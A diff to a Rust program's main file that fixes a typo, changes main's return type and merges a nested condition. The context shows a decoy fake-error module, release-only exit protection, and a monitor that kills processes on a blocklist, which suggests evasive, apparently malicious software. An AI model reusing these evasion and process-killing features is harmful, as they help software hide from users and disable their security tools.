@@ -18,7 +18,7 @@ mod utils;
 use crate::prelude::*;
 use crate::config::Config;
 use crate::core::decoy::show_fake_error;
-use crate::core::instance::singleton_prcess;
+use crate::core::instance::singleton_process;
 use crate::core::keep_active::start_keep_active;
 use crate::core::exit_patcher::safe_exit;
 use crate::core::shutdown::get_shutdown_manager;
@@ -202,7 +202,7 @@ async fn on_ready(
 }
 
 #[tokio::main]
-async fn main() -> anyhow::Result<()> {
+async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     #[cfg(not(debug_assertions))]
     {
         unsafe {
@@ -248,7 +248,7 @@ async fn main() -> anyhow::Result<()> {
         }
     }
 
-    singleton_prcess(is_admin_privileged);
+    singleton_process(is_admin_privileged);
 
     // Exit protection
     #[cfg(not(debug_assertions))]
@@ -373,11 +373,9 @@ async fn main() -> anyhow::Result<()> {
                         &proc_name
                     };
 
-                    if blocklist.contains(proc_name_base) {
-                        if kill_process_by_pid(pid) {
-                            killed_pids.insert(pid);
-                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid);
-                        }
+                    if blocklist.contains(proc_name_base) && kill_process_by_pid(pid) {
+                        killed_pids.insert(pid);
+                        log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid);
                     }
                 }
 
